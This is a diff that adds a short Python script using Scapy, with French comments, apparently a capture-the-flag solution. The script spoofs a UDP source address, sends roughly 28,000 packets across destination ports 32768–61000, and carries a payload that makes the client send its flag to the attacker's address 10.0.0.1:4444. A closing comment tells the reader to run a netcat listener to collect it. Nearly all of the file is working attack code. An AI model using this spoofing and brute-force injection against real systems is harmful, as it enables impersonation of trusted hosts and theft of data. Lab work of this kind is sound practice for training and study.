@@ -1,0 +1,16 @@
+from scapy.all import IP, UDP, Raw, send
+
+# 1. Le payload ordonne au client d'envoyer le flag à VOTRE adresse IP (10.0.0.1)
+payload = b"FLAG:10.0.0.1:4444"
+
+# 2. Construction du paquet avec IP Spoofing (src) et Brute-Force des ports (dport)
+paquet = IP(src="10.0.0.3", dst="10.0.0.2") / UDP(sport=31337, dport=(32768, 61000)) / Raw(load=payload)
+
+print("[*] Début du brute-force UDP avec IP Spoofing...")
+
+# Envoi massif : Scapy va générer ~28 000 paquets usurpés
+send(paquet, verbose=0)
+
+print("[+] Attaque terminée ! Vérifiez votre processus netcat.")
+
+#(N'oubliez pas de lancer nc -lu -p 4444 & dans votre terminal avant de l'exécuter pour attraper le drapeau !)
